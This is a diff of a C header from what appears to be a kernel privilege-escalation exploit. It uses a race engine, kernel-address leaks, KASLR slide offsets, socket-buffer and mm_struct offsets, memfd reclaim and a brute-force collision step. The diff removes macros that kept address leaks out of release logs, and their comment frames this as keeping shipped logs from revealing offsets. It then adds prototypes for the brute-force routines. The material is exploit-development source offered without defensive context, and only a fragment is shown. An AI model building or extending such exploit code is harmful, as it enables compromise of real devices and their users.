@@ -40,34 +40,6 @@
 
 #include "kernelsnitch/utils.h"
 
-/* Address-printing diagnostics are compiled out of release builds.
- *
- * The `offsets audit` block in util.c prints the whole table (imported value,
- * built-in fallback, address actually used), so one native log is enough to
- * rebuild the offsets without touching the binary.  The slide addresses, the
- * route diagnostics in fops.c and the vr.ko neutralize line leak the same
- * thing piecemeal.  They now go through gl_addr_*(), which expands to nothing
- * unless GL_VERBOSE is defined:
- *
- *     make ghostlock CFLAGS_EXTRA=-DGL_VERBOSE
- *
- * Stage names and success/failure lines are NOT gated, so a shipped log still
- * shows where a run stopped.  pr_error is never gated.
- *
- * NOTE: dropping these writes changes how much I/O the engine does between
- * race steps.  The engine is timing sensitive, so a release build with this
- * gate must be A/B'd on a real device before it ships; -DGL_VERBOSE
- * reproduces the exact logging of the previously verified build. */
-#ifdef GL_VERBOSE
-#define gl_addr_log(...) pr_success(__VA_ARGS__)
-#define gl_addr_info(...) pr_info(__VA_ARGS__)
-#define gl_addr_warn(...) pr_warning(__VA_ARGS__)
-#else
-#define gl_addr_log(...) do { } while (0)
-#define gl_addr_info(...) do { } while (0)
-#define gl_addr_warn(...) do { } while (0)
-#endif
-
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #define SKB_DATA_DELTA (-0xe80LL)
 #define MM_STRUCT_SZ 0x500
@@ -207,9 +179,15 @@ pid_t clone_leak_child(void);
 int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
+void setup_kernelsnitch(void);
+int kernelsnitch_collisions_ready(void);
+void run_kernelsnitch_bruteforce(void);
+uintptr_t current_kernelsnitch_mm_struct(void);
+uintptr_t cleanup_kernelsnitch(void);
 void close_ctx_memfds(struct mm_ctx *ctx);
 void free_ctx_storage(struct mm_ctx *ctx);
 void cleanup_page_prepare_state(void);
+int clone_memfd(void);
 void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base);
 uintptr_t prepare_kernel_page(void);
